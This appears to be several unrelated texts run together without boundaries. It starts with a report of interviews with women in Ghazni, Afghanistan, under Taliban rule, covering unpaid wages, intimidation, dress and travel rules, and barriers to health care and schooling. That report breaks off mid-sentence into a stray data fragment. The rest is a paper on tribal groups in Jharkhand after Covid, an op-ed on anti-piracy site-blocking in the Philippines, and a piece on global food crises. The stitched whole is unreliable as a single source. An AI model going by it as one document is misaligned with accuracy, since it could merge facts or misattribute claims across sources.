“A few days after the Taliban took over Ghazni and Kabul, Mullah Baradar [a senior Taliban leader] said that women can go back to work,” a government worker said. “I went to work, but I was not allowed to go in. The Taliban members said, ‘We don’t need women to work anymore. You should not come back until further notice.’ But we are breadwinners of our families.” Her last paycheck was in July, and she is losing hope of being paid. “We used to go to show attendance, but they asked us to stop that as well.” She said some of her male colleagues were also dismissed and most government offices were closed because they did not have qualified staff.

Those still working have largely not been paid because health care and education were almost entirely financed by foreign donors, whose aid has been cut off. The only interviewee being paid regularly was working for an international nongovernmental group. “We haven’t been paid for more than five months,” a midwife said. “It’s very hard to manage for nurses and service staff because we don’t have any other source of income. The doctors have their private clinic or healthcare center. I personally find it very hard since I’m the breadwinner.” As of early January she still had not received her salary.

While primary schools for girls are open, the teachers have not received their salaries. A primary school teacher who is the main wage earner for her family of 10 said: “It’s been three months that we haven’t been paid. We go and teach, but nothing.” Her salary was 5,500 afghanis (US$46) per month and she previously supplemented this by teaching at a private school, but the private school also stopped paying teachers. She spends 300 to 350 afghanis ($2.50 to $2.90) a month for transportation to work, money she now takes from savings or family members.

“UNICEF has taken the responsibility to pay the teachers, but we don’t know when and how,” she said. This teacher later received one month’s salary from her principal, but no back pay, and did not know the source of the payment.

Taliban restrictions have compounded the financial crisis for women. The owner of a business exporting products produced by female farmers said the farmers are no longer allowed to work, the products cannot be exported, and the farmers she sources from cannot afford transportation costs. “The Islamic Emirate [the Taliban government] does not allow women to work; even the women farmers cannot work on lands,” she said. “They used to work with us, but they all must stay home now.”

The financial crisis has decimated even paid work within the home. “We would weave or do embroidery – there was a market for that,” one woman said. “Now there are no jobs, no buying and selling. People have no jobs, no motivation and hope.”

A single mother who has not been paid for five months borrowed 10,000 afghanis ($83) from a cousin living in Saudi Arabia for a birthday celebration for her young daughter. “I want her to know that at the height of poverty, I care about her birthday and happiness,” she said.

Financial Crisis and Rising Prices

A financial crisis followed the Taliban takeover on August 15, as the economy collapsed and banking system froze. About 75 percent of the previous government’s budget came from foreign donors, but most halted their aid to government agencies and institutions shortly before or after the Taliban takeover. The Central Bank of Afghanistan, under Taliban control, has been cut off from the international banking system and access to the country’s foreign currency reserves.

The International Monetary Fund, reportedly at US request, prevented Afghanistan from accessing credit and assets. Past United Nations Security Council resolutions imposing sanctions and other restrictions on the Taliban for terrorism-related actions prevent the Central Bank of Afghanistan from receiving new paper Afghan currency, which is printed in Europe.

Much of the state bureaucracy is no longer functioning because many workers from the previous Afghan government have fled the country, or are afraid of returning to work, and the Taliban authority lacks funds to pay workers. Some humanitarian aid and other assistance provided by UN agencies and nongovernmental organizations has gradually restarted but remains severely curtailed due to Taliban restrictions, logistical difficulties including barriers to transferring money into the country, security concerns, staff evacuations, closures, and legal uncertainties including fear of violating sanctions. The UN World Food Programme has issued multiple warnings of worsening food insecurity and the risk of large-scale deaths from hunger throughout Afghanistan.

Ghazni interviewees, regardless of their financial situation before August 15, all said they felt the consequences of the financial crisis. “Our money has been frozen; we have no cash, we cannot feed our children,” a former worker for a nongovernmental group said. “It’s hard to run our lives.”

“The prices are getting higher on a daily basis,” a former government worker said. “Widows and female breadwinners who were the sole provider of their families are now facing high levels of difficulty. It’s painful to watch them turning to beggars with their children.”

“In Ghazni city, an egg costs 13 afghanis; it was 6 afghanis before [$0.11 versus $0.05],” one woman said. “All the essential food items have become impossible to purchase. Even Ghazni’s vegetables and its products have become so expensive. …Twenty-five kilograms of wheat would cost 1,500-1,700 afghanis [$13-$14]; now it’s sold at 2,500 afghanis [$21].” Another woman said the price of a jug of cooking oil had increased in her area from 500 afghanis to 3,000 [$4 to $25].

“We don’t go to the city anymore,” a former student said. “We can’t afford to buy anything.”

Because of a lack of liquidity and the freezing of the banking system, banks have often run out of cash and the Central Bank imposed a limit on withdrawals of 30,000 afghanis ($250) a week. Individual banks impose their own limits, usually $200 per week. Those with savings have difficulties accessing their money, and are afraid as their savings dwindle.

“We are a family of eight, and I have a university student in my family, I have school students, and my grandchildren are still kids,” a former nongovernmental agency worker said. “I was the only breadwinner of the family… No one works in our family now. We have survived by our friends’ support. We can only get 20,000 afghanis [$167] cash from the bank. My savings are ending.”

The financial crisis has affected daily lives in various ways. One woman also said that her area had experienced rising power cuts: “Most families do not have access to electricity even at night.”

Intimidation and Threats



Taliban authorities in Ghazni city search for women they see as having engaged in behavior they find unacceptable. A woman previously with a nongovernmental agency said she was in hiding, moving locations frequently:

I heard that they [the Taliban] entered our office. They collected our computers, saying, “These are the women who work for the foreigners.” …The night that the Taliban attacked the center of Ghazni, I fled to [another province] early the following day. They had asked about me. The imams have told me that the Taliban have asked them to report women who have worked with foreign NGOs [nongovernmental organization] and those who attempt to leave the country. …I was worried that our neighbors would report me to get credit from the Taliban. … I fear my colleagues as well; they might report me just to save their own lives.

Several said they had relatives or friends in hiding who were afraid to be interviewed. “Women who were in the army or worked as police were targets,” a government worker said. “Women’s rights activists feared for their lives and either left the province or stopped their activities. I fear for my life too: I worked, and I was active in civil society. I don’t do those activities anymore.” Several cited the Taliban’s killing of two female police officers in Ghazni, days before the province fell to the Taliban, as having struck particular fear among women in the community.

The international nongovernmental group worker said international groups were still functioning: “Because these organizations are run by the foreigners, the Taliban don’t tamper with them,” but national groups that “worked in legal sectors, promoting human rights and justice” had all been shut down. She said the group she works for had instructed its employees not to be involved in activism and to stay off social media: “The Taliban have communicated their policies and informed [the organization] not to engage with human rights, women’s rights, and other issues. It can only work in the health sector.”

Some women felt heightened risk because of both gender and ethnicity or religion. “It’s difficult for us because we are the Hazara minority,” a healthcare worker said, referring to her ethnic group, which has long been persecuted in Afghanistan. “When we talk to [Taliban members], they don’t even look at us, they don’t consider us at all,” she said, referring to Hazara staff members at her health facility. “I am impatient, and I confront them sometimes, but they threaten us, saying we would get fired, or be killed.”

The Taliban’s return to power has made members of some ethnic and religious minorities feel more vulnerable to threats even from those not affiliated with the Taliban. The healthcare worker said a colleague who is Shia, a religious minority, was threatened by a patient’s family she believed might be connected to the Taliban, who said: “‘We will kill you, terrorize you, or get you fired from your job.’ They warned my colleague that they know her address.”

She said that a Taliban administrator monitors the hospital: “The Taliban know name and details of each one of us. All the internal administrative details regarding our work and shifts are shared with and reviewed by the Taliban. For instance, they know about details such as a nurse’s duty shift.”

“The violence of the Taliban is seen in many ways,” a government worker said. “It is a form of violence when they don’t let women to work. It is violence when they don’t let young people get education. They have taken every hope from people – that is violence... They rule by fear. It’s painful to watch the society living in fear.”

Taliban authorities have also used intimidation to extract money, food, and services. “When the Taliban visit a village, they force the households to feed them and collect food items from people,” a woman from a village said. “The Taliban and their fighters call us in the middle of the night to cure and give special treatment to their patients and families,” a health worker said. “They enter the hospital with their guns, it’s difficult for the doctors and nurses to manage.”

Interviewees said the Taliban extorted money. They sometimes said they were demanding “taxes,” but the demands were made without standard rates or transparency and in a context in which communities have lost many government services. One woman said the Taliban had dramatically increased taxes on her farming community to a level that families simply could not afford.

“The problem is that in the Taliban’s government, you cannot complain anywhere,” she said. “Who would you complain to? There’s no one to monitor the situation. There’s also no help from the government, no humanitarian assistance as before. Unfortunately, all windows of hope are closed on us.”

“The Taliban collect taxes from the districts,” a former government employee said. “We have no choice but to pay the amount – we have seen and experienced Taliban’s cruelty. If they don’t pay, the Taliban fine and detain them.”

New Forms of Insecurity

After the Taliban takeover, the national police, which had functioned as a counterinsurgency force, largely disintegrated. Fighting has mostly ended in the country, but people expressed fear of violence and arbitrary arrests by the Taliban and lack of rule of law, and reported increased crime in some areas. “Since the Taliban started their government, the security situation in [a district of Ghazni] hasn’t gotten any better – in fact, it has been getting worse,” a student said. “Previously, women could go outside and commute freely to the town, but now even men don’t feel safe walking outside. There are increasing cases of robbery and theft in the district…And there’s no [organized] police to protect the area or to monitor the situation.”

“We kept hearing from some people that with Islamic Emirate there will be more security, no explosions and theft, but we see that they still happen,” a teacher said. “Banks are empty, no businesses, no economy. Theft and robbery have increased. We hear that in the districts [outside the provincial capital] there’s increased robbery every day. They steal cars and motorbikes in daylight…In Ghazni [City], in an educational center, they caught a person who wanted to explode himself – he didn’t succeed.”

One woman felt that crime had fallen – although there are no reliable crime statistics – but said for her that was not the most important measure of security:

What does it mean to have some level of security, but not having a job, no income, no food, when you don’t feel safe, what kind of security is that?...The human rights activists, journalists, and others are hiding; they don’t feel safe. Wherever we go, we fear for our lives, every time. What kind of security and safety is that?... I don’t feel safe at all.

Women also felt more insecure because the Taliban dismantled systems that assisted women facing gender-based violence. The former nongovernmental group worker said women used to turn to Ghazni’s Provincial Department of Women’s Affairs (a branch of the Ministry of Women’s Affairs) for help. But after the Taliban closed the ministry, they turned over the Kabul headquarters to the reinstated Ministry for the Propagation of Virtue and the Prevention of Vice, which monitors residents’ behavior and in the 1990s had beaten women who violated Taliban policies including its strict dress codes or work or education prohibitions. In Ghazni city, she said, the Department of Women’s Affairs office “has now been turned into military space.”

New Rules for Women’s Conduct, Dress

The Taliban have imposed new restrictions on women’s dress and conduct, which affect every aspect of their lives, including their career options. “Women can only become teachers or nurses, nothing else,” the government worker said. As the Taliban took control, new rules were imposed immediately. A health worker described going to work on the day the Taliban took over her city. “When I was trying to pass, they didn’t allow me to go,” she said. “They said you don’t have a mahram [male family member chaperone], and you’re not wearing a burqa.”

Women dress carefully to avoid the Taliban’s notice. “I wear a burqa, and my life has changed so much,” a former nongovernmental group worker said.

“The Taliban government has affected our daily lives,” a student said. “In the past, when I would come to Ghazni, I would wear the same dresses as in Kabul, and I could go around the city on my own. But now we are required to wear a burqa, and our commute to the town is restricted.”

A primary school teacher said she and her colleagues changed their dress to avoid Taliban abuse. “In the past we had a particular uniform. …It’s just long dresses now. …Long dresses, burqa, no high heels, and no sandals.”

Zabiullah Mujahid, a Taliban spokesperson, said in an interview in Kabul on September 7 that being accompanied by a mahram would only be required for travels longer than three days, not for daily activities such as attending work, school, shopping, medical appointments, and other needs. Interviewees said they are usually not required to have a mahram, but there seem to be new pressures by the Taliban on taxi drivers not to transport women traveling alone.

The ambiguous rules and atmosphere of fear encourages caution and impairs freedom of movement. “It’s affecting our morale watching the Taliban’s behavior with women,” one woman said. “In cases when they beat women, it’s hard for women to think of leaving their houses without a mahram.

“For now, we aren’t asked to have a mahram,” a former nongovernmental group worker said. “But I take my husband with me because I’m not sure. In Kabul, they seem to be more tolerant currently. In other provinces, they make a problem for those who don’t dress up and comply with their rules.”

“We don’t leave our home much,” a government worker said. “When we leave, we leave with a mahram. Some things like sanitary pads must be purchased by women themselves, but it’s hard to do it with a man accompanying us. …Women can’t take transport, they either must go out with a mahram or walk. They should walk with burqa, no heels, no makeup.”

Not everyone has a mahram available. “Most women bring their mahram when they visit my mother,” said a woman whose mother runs a home-based tailoring business. “But some women do not have their mahram, as their men work in other countries. There’s no jobs for men in Ghazni or Afghanistan. They’ve gone to Iran or other neighboring countries for work.”

Unmarried women linked the potential need to have a mahram and increased pressure to marry. “Thankfully, in Ghazni having a mahram is not an issue yet,” a single woman said. “If we are forced to walk with a mahram, I will stay home. Who can agree to a forced marriage? I have brothers [who could serve as mahrams], but they’re married and are busy with their own lives.”

When women are allowed to work, their workplaces operate under new Taliban restrictions. A health worker said her boss arranged a meeting with a senior Taliban official. “The hospital assembled all female staff to tell us how we should behave after this,” she said. “How we should dress, and how we should work separately from the male personnel. We were advised to talk to male personnel in an insolent manner and angry tone, not in a soft tone, so that we don’t evoke sexual desires in them.”

There were also new requirements to wear a burqa and a long dress. “The white uniform was to be worn over the dress,” the health worker said. “It’s so hard to walk and work with a long dress as a nurse,” adding that they sometimes need to run when handling emergencies. She tried to switch back to her normal uniform – trousers, knee length tunic, and lab coat – after a few days but was reprimanded and threatened with dismissal.

In the meeting, she said Taliban members refused to speak with the women. “They’d ask male personnel’s opinion,” she said. “But when it came to women, they said, ‘Whatever problem you have, don’t raise your voice. Don’t talk to us, write your problems so we can read them…Men should not hear women’s voices.’”

Restrictions on women’s access to technology harm their access to information, including health information. “Women are asked to not carry smart phones,” a health worker said. “They said women should keep simple Nokia phones that don’t have many options.”

A government worker said the Taliban told male shopkeepers and tailors that they may no longer interact with women, and women had been told they should sew their own clothing rather than go to a male tailor. The new rules for dress and conduct – including that woman should not socialize outside their houses – were sent in writing to the mosques, an interviewee said. Men also face restrictions, she said, including not being permitted to wear non-traditional clothing or shave their beards.

A business owner said she tried to join Chamber of Commerce and Investment meetings but was turned away. She was allowed to attend a conference on women’s business, but women were separated from male attendees with a curtain and not permitted to speak. “Around five or six men spoke in the event – they were from the Ministry of Commerce, Afghanistan Chamber of Commerce and Investment, and the Ministry of Culture,” she said. “The exhibition was held symbolically – with women brought to show.” She gave a media interview at the conference, but it was not released. “The Ministry of Culture will edit the news before any media can publish their reports. … Our media are being censored now so that they couldn’t publish the conference report.”

Rules are enforced through Taliban inspections. “The cleaning staff said they come around sometimes and ask about the teachers’ clothing,” a primary school teacher said. “The guard would tell them, ‘Yes, they wear hijabs, both teachers and students.’ The principal tells us to be more careful with our clothing and hijabs.”

“Men with local clothing come and check the personnel and the hospital,” a health worker said. “We don’t know if they are Taliban or not.”

Barriers to Health Care

Taliban restrictions on women, difficulty discerning what they are, and arbitrary enforcement impair women’s access to health care. “Doctors are also scared of treating female patients,” a government worker said. “It’s also hard to find female doctors.” She said there used to be more women healthcare workers in private hospitals and clinics, but they are harder to find now.

A former medical student accompanied her pregnant sister-in-law to the doctor. “The Taliban didn't let us enter the clinic because we didn't have a mahram,” she said, adding that the appointment was with a female doctor and the clinic was segregated by gender inside. To enter the facility, however, they had to register and receive a card and the person handling this process was a man. Taliban rules prohibited him from interacting with women, and only permitted him to speak with their mahram. The women were forced to call the interviewee’s brother, who arrived an hour later, to register them. “They don’t even have mercy on pregnant women, let alone others,” the student said. “This is so humiliating.”

Barriers to Education

Girls and women in Ghazni face a range of barriers to accessing education, including the current Taliban ban on the operation of girls’ secondary schools in 27 of Afghanistan’s 34 provinces, including Ghazni. “I am so worried for the girls,” a teacher said. “They have worked so hard. Girls in grades 7 to 12 have to stay home. They call us and ask about schools reopening. We tell them we don’t know yet. I can’t give them a false promise. I ask them to follow the news and internet, [and tell them] you can come when it’s announced.”

Another teacher said of her secondary school students, “Now we are asked to grade them with a ‘pass.’ How can we grade them if we don’t know where they have been, where they are? We don’t know if they are dead or alive, are they still here, have moved to another province or country?”

University students, many of whom studied outside of Ghazni, have seen their classes close with no information about when or whether they will be able to resume studying. “All the university students like me who left Ghazni for education are forced to return,” a medical student said. “We are all sitting at home, not knowing what will happen to us.”

“My younger sister wanted to go to the university but now she must stay home,” one woman said. “All universities in Ghazni are closed.”

Girls’ primary schools are open, but the knowledge that secondary school is closed distracts them. “The girls in 6th grade are worried,” a teacher said. “Their mental health is affected – they worry about their future. Seeing the older girls not going to school, they have lost morale.”

“The students ask what would happen to them after grade 6, and we tell them, ‘God is kind,’ another teacher said. “Hopefully they can continue.”

Primary school teachers come to work while secondary school teachers wait at home to see if their schools will reopen and their employment will resume. A teacher said that nonpayment of teacher salaries even for open schools is affecting the quality of education: “Some teachers who come to school don’t have the motivation to teach their class, because there’s no salary.”

Private schools have had more flexibility to stay open, but the financial crisis has also hit them. “There are some private schools, but they are about to go broke,” a former government worker said. “People cannot pay for their children’s private schools because they have lost their jobs.”

Teachers reported varying student attendance. One said that at her school only about 50 percent of the students enrolled in grades five and six attend. Another said that after the Taliban took control many students stayed home out of fear, but they gradually returned to school. “We were scared as well,” she said of the teachers. “It would make us panic seeing them [the Taliban], but now, we are used to it.”

The humanitarian crisis also affects children’s ability to learn. “Many come to school hungry, a teacher said. “It is hard because as a teacher I can’t do much for them because we don’t feed kids at school.”

“Some girls don’t have money for books or supplies,” the same teacher said. The price of schoolbooks has increased.

“Our students cannot afford to buy schoolbooks,” another teacher said. “If a schoolbook cost 30 afghanis [$0.25] before, now it’s no less than 80 afghanis [$0.67]. …In a class of 40 students only four or five manage to buy books.” She said teachers try to write a summary of the lesson on the board, but lack of books was severely harming their ability to teach.

Curriculum Changes

Teachers reported that the Taliban had already made changes to the curriculum. “More religious subjects have been added,” a teacher said, and subjects such as physical education and art that were deemed “unnecessary” were removed to make space in the school day. Islamic religious studies were already part of the curriculum, but the Taliban have significantly increased the focus on these studies. “The Taliban think that before them there was no Islam and Muslims in the country,” a former government worker said.

These changes alarmed some teachers. “Even if the teachers are not ready to teach the subjects, they must do it,” one said. “There was a rumor that if we can’t teach religious subjects, they will bring in their own religious teachers from the madrasas [Islamic schools]. Teachers are anxious, everyone thinks their subject will be removed.” An interviewee whose brother teaches at a boys’ secondary school said that its curriculum was also changed: “The Taliban have removed some of their subjects like sports, civil rights subjects, social studies, and some other subjects.”

Mental Health Consequences

Interviewees spoke often about trauma, fear, uncertainty, and a loss of their identities as students or workers in the months since the Taliban’s return. One woman said that on the day Ghazni fell to the Taliban: “I felt so hopeless that day, because I have a small daughter. I was working so hard to make a brighter future for her. I had imagined many things for her to learn and become. I felt that I lost all the plans I had for my daughter’s future.”

“I am keeping low profile now,” said a woman who said she had been active on social media advocating for justice and women’s rights. “I have stopped activism and it’s as if I have closed my eyes to reality.

“I’m an independent woman – I used to travel alone, and I lived alone,” a former medical student said. “It’s hard to think of staying home now…It affects my mental health. We had so many dreams and many big goals in life; dreams and goals vanished before our own eyes. Psychologically, this state of uncertainty affects us too much. A group of people who are complete misogynists is controlling our life now. It's too hard to bear this.”

Many interviewees struggled to find purpose. “I suggested teaching girls in my community for free,” the medical student said. “But no one accepted. There is no motivation. They came back to me asking, ‘What have you achieved when you studied?’ Because we are all staying home, there’s no point.”

“I wanted to serve my family and society, but unfortunately, I can’t now,” another former student said. “Since I’m not working and there are no activities outside for women, I don’t leave home at all. It’s very hard, staying home.”

Interviewees described intense social isolation. A woman who previously worked for a nongovernmental group with other women said her brothers had asked her to stay at home, but she missed her work desperately. “It feels as though I have lost something when I don’t check in with other women.”

“Before the Taliban, I used to hang out with my male friends,” one woman said. “I used to go to places and sightseeing with my friends. But after the Taliban everything is banned for us. For men, things haven’t changed…A few days ago, when my male friends were arranging a trip, I told them they have forgotten about me. They said the situation is dire, it’s difficult – but they miss me… We are not comfortable anymore. We used to be ourselves, but now, we need to perform, look angry, so that the Taliban think we are decent women.”

Feelings of isolation were sometimes exacerbated by others celebrating the Taliban’s return. “When the Taliban took over, most of the people in the hospital turned out to [support the Taliban],” a health worker said. “They thanked God, saying jihad and mujahidin won and the infidels lost. I didn’t expect it from some people.”

Recommendations

The Taliban should fully respect the human rights of all women and girls and ensure full gender equality in accordance with their obligations under international human rights law. The UN and other international bodies, foreign governments, and other entities, including UN Assistance Mission in Afghanistan and the incoming UN special rapporteur on Afghanistan should press the Taliban to meet its international human rights obligations. Donors should engage with the Taliban regarding their violations of the rights of women and girls in Ghazni and across the country and should work to resolve the humanitarian crisis without deprioritizing the rights of women and girls.

The Taliban should urgently:

Clarify that women and girls are free to leave their homes at any time, alone or with others, and dress as they choose;

End all requirements for women to be accompanied by a mahram, and at least reiterate and require Taliban members to comply with the Taliban spokesperson’s statement in September that women are not obliged to have a mahram for journeys of less than three days’ duration;

Reopen all government secondary schools and universities, and encourage and facilitate the reopening of private educational institutions;

Permit all women to participate in any form of employment;

Reestablish the Women’s Affairs Ministry and its subnational offices; and

Appropriately discipline Taliban members who harass, threaten, or otherwise interfere with women’s and girls’ rights and establish a meaningful system for women and girls to report abuse.

Donors should urgently support assistance to women and girls in Ghazni and across the country that is tailored to the current crisis. This assistance should include:",Livelihood Crisis,2022-01-18 08:00:00

ABSTRACT

Jharkhand is a state rich in natural resources consisting of plateaus, small hills and forests located in the eastern part of India. Despite being a prosperous state, it faces challenges such as malnutrition, hunger, unemployment, illiteracy, corruption, poor health services and controversial politics. Even though Jharkhand is considered one of the wealthiest states in India, most of the people here are poor. Because the state’s indigenous people are continuously suffering in the name of industrial development, they are being forced to migrate from their Jal, Jungle, and Zameen. Their means of livelihood are being disrupted, and they are being denied social, economic, educational and political rights. Due to the above problems, the marginalized people face twofold challenges at the socio-economic level. Recently, Covid 19 hit these marginalized groups so severely that they do not have enough resources to survive their daily lives.

DEMOGRAPHIC PROFILE

India is the second-most populous country in the world. According to the 2011 census, the total population of India was 121.08 crores. Is. At the same time, the population of Jharkhand is 3.29 crores out of the total population of India. According to the 2011 census, 67.83% Hindus, 14.53% Muslims, 4.30% Christians, 0.22% Sikhs, 0.21% no religion, 0.08% Jains and Buddhists, and 12.84% other religions live in Jharkhand on religious grounds. About 75 lakh tribal populations of 32 tribal groups reside here. Out of which eight tribal groups, Asur, Birhor, Birjia, Korwa, Mal Paharia, Parahiya, Sauria Paharia, and Savar, have been identified as “Particularly Vulnerable Tribal Groups” (PVTGs). Whose population is about 2.92 lakhs & it is about 1% of the state’s population. As of the 2011 India census, Palamu has a population of 1,939,869. Palamu constitutes sixth place among 24 districts of Jharkhand. Scheduled Castes (27.65%) and Scheduled Tribes (9.34%) make up 36.99% of the population. The religious population of the district, as per the 2011 census, is 86.77 % Hindu and 12.28 % Muslim. Linguistically in Palamu, 65.49% of the population speaks Hindi, 24.44% Magahi and 6.87% Urdu. The total literacy rate of the district is 65.5%. Particularly Vulnerable Tribal Groups (PVTGs) are one of the most marginalized and excluded tribes in Jharkhand. Their population is significantly less.

The situation is more or less the same as that of Palamu, a district located in the north-west part of Jharkhand. PVTGs derive their livelihood from forests and land resources. They are of primit ive and archaic nature. Their literacy level is shallow, and they suffer from poor health conditions. During field observation, it has been observed that they are deprived of formal education, housing, health, transport and drinking water. PVTGs have not become a part of the mainstream economy because their traditions, cultures, beliefs and practices are all tied to nature, from which they derive everything, so they respect nature outside, which reflects their strong legacy of respecting the natural world. The socio-economic condition of PVTGs in the district is pathetic, and this can be analyzed from their standard of living and struggles in daily life. This research paper is based on field visits and interactions with PVTGs residents in the Palamu district. In this, an attempt has been made to find out the post-pandemic status of PVTG families.

They were initially identified as Primitive Tribal Groups (PTGs). These were later named Particularly Vulnerable Tribal Groups (PVTGs). These communities have not yet achieved socio-economic development even in the race of contemporary developed society and, for various reasons, live segregated in settlements without infrastructure due to a lack of administrative support. However, these communities benefit from some schemes run by the government like Dakiya Yojna, Tribal Pension Scheme, Awas Yojna etc. The first step in the significant issues of PVTGs is to give them legal recognition, and the Dhebar Commission took this step in 1961. Again in 1969, the Shilu AO team realized the need for separate central schemes for all-round development and upliftment of PVTG. It was also necessary to lay down some guidelines for characterizing PVTGs. After the workshops and conferences organized on the primitive tribal communities, some guidelines were decided in 1975. The Center has been assisting them with their planned development since the 5th Five Year Plan.

POST-COVID IMPACT

The impact of the pandemic crisis has gradually started affecting the largely poor and marginalized communities of the society socio-economically. Corona has deeply affected the income standards of rural or remote areas. The pandemic has badly affected the functioning of many industrial units and construction sites. As a result majority of the people have become unemployed. The skilled workers employed there are compelled to work as unskilled labour. In this way, Corona has made a double attack on the people. Since PVTG is already working as unskilled labour, it has become even more difficult for the tribal community to find work when the mainstream majority is forced to work as unskilled labour. Special attention is needed for their employment generation.

GOVERNMENT MESURES

Several schemes have been implemented by the State and Central Governments for the economic development of Primitive Vulnerable Tribal Groups (PVTGs). In which emphasis has been laid on the development of infrastructure. They are providing funds for activities such as housing, land distribution, land development, agricultural development, animal husbandry, and establishment of non-traditional sources of livelihood, energy, and social security, including Janashree Bima Yojana or comprehensive socio-economic development of PVTGs. Particular Preference is assigned to PVTGs under Special Central Assistance (SCA) schemes to the Tribal Sub-Scheme (TSS), as per Article 275(1) of the Constitution, and Grants-in-aid to Voluntary Organizations working for the development of Scheduled Tribes. Asper guidelines, each state/territories administration needs to prepare an extensive Conservation-cum-Development (CCD) plan, around five years for each PVTG within their territory. Outlining the initiatives would cover financial planning and the agencies charged with the responsibility of undertaking the plan. The Scheduled Tribes and Other Traditional Forest Dwellers (Recognition of Forest Rights) Act 2006 (FRA) provide the forest and habitat rights of the PVTGs families.

For the protection and conservation of Particularly Vulnerable Tribal Groups (PVTGs), the Jharkhand government has also started many new schemes. Under which basic facilities are being made available to the families of the primitive tribes through the Primitive Tribes Food Scheme (Postman Scheme), Birsa Munda Awas Yojana, Birsa Pension Scheme etc. One of those schemes is the Postman Scheme. Prior to this scheme, PVTGS families had to make rounds of the PDS dealer’s shop to get ration. But through this scheme, free food grains are being delivered regularly to their homes every month. However, the plan is facing several challenges at the ground level. With the participation of various stakeholders, these problems can be reduced, which will help achieve the mission objective.

Concluding Remark

Corona has shaken the whole world mentally and economically weak and socially isolated. Although the entire world is now recovering from Corona, marginalized communities still struggle to live everyday lives. However, conditions are still not normal for the most vulnerable marginalized people. In that too, especially the vulnerable tribal group (PVTG) families face many problems like struggling to get a job. As social and economic activities are returning to normal in the state of Jharkhand, now marginalized people also started moving to find their means of livelihood. However, the hesitancy among PVTGs is still high that needs special attention from government and non-government agencies for their upliftment. PVTGs have a seamless relationship with their land and habitat and are linked to Jal, Jungle, and Zameen. Therefore, protecting their water, forest and land should be at the heart of any policy formulation or development initiative related to PVTGs. Otherwise, all development initiatives may cause their downfall instead of their rise, as seen in respect of tribes like Shompens and Jarawa of Andaman and Nicobar Islands, Abhuj Maria of Chhattisgarh etc. These tribes are on the verge of extinction today; thus, PVTGs need special and undivided attention to prioritize their protection and support. Fragile living conditions; Prevailing socio-economic vulnerability and declining numbers.

The Intellectual Property Office of the Philippines (IPOPHL) has launched a year-long celebration of its 25th anniversary, highlighting the potential of harnessing intellectual property assets as the country works towards economic recovery from the pandemic crisis.

IPOPHL Director General Rowel S. Barba in a statement said their vision is “to see a progressive Philippines that uses intellectual property assets for inclusive economic and social development.”

To understand what and how important intellectual property assets are as a major contributor to an economy, let’s look at how South Korea developed what they call “Hallyu” or “Korean Wave” which, according to a 2012 report of the Korea Creative Industry, had a total value of $5.02 billion in cultural exports.

A great example is the globally popular K-Pop group BTS which produced $4.9 billion in sales in 2020. This is from just one seven-member group of a huge Korean entertainment industry producing content that has successfully gained appeal and patronage to a global audience.

On the other hand, the 2018 Creative Economy Outlook reported by the United Nations Conference on Trade and Development (UNCTAD) estimated the Philippines creative goods exported at $3.23 million and created $912 million in terms of creative services.

When clustered with the Asia-Pacific this is only 2 percent of the region’s output.

But still, our potential is there because of the creative ability of Filipinos. So many have garnered international accolades on fortunes on their own with government merely playing cheering squad.

IPOPHL’s vision of developing a creative economy as a major economic growth engine will indeed start with the protection of the intellectual property rights of Filipino talent rampantly violated by online piracy.

According to the 2020 report by Media partners Asia, our already struggling video industry suffered P1 billion in potential revenue losses from online pirates illegally streaming their movies thru various platforms on the internet.

The legitimate streaming industry also lost an estimated P6.3 billion.

These staggering figures of online theft directly affects the whole value chain of the creative industry which is not just the businesses of video producers, distributors and aggregators but more so the livelihood of the talent and production crew who are mostly employed on a gig basis.

While the fast innovation of cloud-based technologies and digitization greatly lowers production cost and gives market access to all internet users of the planet, what was an analogue mode of producing video and audio content for more than a century has now become a limitless digital picking field of online criminals who have created canny illegal streaming sites to lure away patrons from legitimate platforms.

This digital phantom of a menace must be stopped if we are to prevent a collapse of our distressed creative industry.

In the latest published statement of CitizenWatch Philippines, our co-convenor Atty Tim Abejo is calling on the incoming lawmakers of the 19th Congress to empower IPOPHL with powers to “implement rolling site blocking to effectively purge online pirates who violate intellectual property and threaten the viability of the creative industry.”

In fact, we are the only country among ASEAN nations not enforcing the more pro-active approach of rolling site-blocking as an anti-piracy mechanism where access to a piracy website is denied.

This method increases the likelihood of pirates being pursued regardless of wherever they strike for pirated content.

This is possible but will need close coordination between government, internet service providers (ISPs), and stakeholders.

Director General Barba in a published statement said that “Site-blocking will enable IPOPHL to craft its own guidelines on takedowns, such as having ISPs comply within hours instead of several days as the current process would take.

“Rolling site blocking, as opposed to simple site blocking, will be disruptive as it will provide rights owners with the swift response they need in preventing further harm to their IP rights and potential revenues.

“Online piracy does a great disservice to Filipino artists and inventors by undermining their creative potential and obstructing their ability to fully contribute to the economy.

“It threatens all workers in creative industries, not only for what they actually lose, but for all other opportunities they will miss in the future.”

Enforcing rolling site-blocking will encourage needed investments to awaken what I consider is a suppressed economic potential that just needs a supportive government to boost itself and conquer a content hungry digital economy.

The success of our ASEAN neighbors in bumping out online pirates has yielded immediate benefits to the legitimate IP owners and stakeholders of their creative industries.

South Korea’s K-pop phenomenon is a good model of how government recognized a potential and nurtured a virtually non-existent industry to an international entertainment powerhouse.

I believe that we have an even greater talent potential that just needs the protection and opportunity to light up this digital world with our creative power.

The number of people facing acute food insecurity and requiring urgent life-saving food assistance and livelihood support continues to grow at an alarming rate, according to a new study.

Launched today, the Global Report on Food Crises, confirms it is more urgent than ever to tackle the root causes of food crises rather than just responding after they occur.

Acute food insecurity is when a person’s inability to consume adequate food puts their lives or livelihoods at immediate risk and differs from chronic hunger (when a person is unable to consume enough food over an extended period to maintain a normal, active lifestyle).

Published by the Global Network Against Food Crises – an alliance of UN agencies including the World Food Programme (WFP), the European Union (EU), governmental and non-governmental bodies – the report lays bare the scale of the challenge at hand.

Around 193 million people in 53 countries or territories experienced acute food insecurity at crisis or worse levels in 2021, according to the global standard for measuring food insecurity – the Integrated Food Security Phase Classification (IPC).

This represents a dramatic increase of nearly 25 percent – 38 million people – compared with the already record numbers of 2020.

Among these, 570 000 people across Ethiopia, South Sudan, southern Madagascar and Yemen were classified in the most severe phase of acute food insecurity – at IPC5 or ‘catastrophe/famine’ - and required urgent action to avert widespread collapse of livelihoods, starvation and death.

When looking at the same 39 countries or territories featured in all editions of the report, the number of people facing crisis or worse (IPC 3 or above) nearly doubled between 2016 and 2021, with unabated rises each year since 2018. These worrying trends are the result of multiple drivers feeding into one another, ranging from conflict to environmental and climate to economic and health crises with poverty and inequality as underlying causes.

Conflict remains the main driver of food insecurity, the report confirms. While its analysis does not include the impacts of the conflict in Ukraine, it shows that the war has already exposed the interconnected nature and fragility of global food systems, with serious consequences for global food and nutrition security.

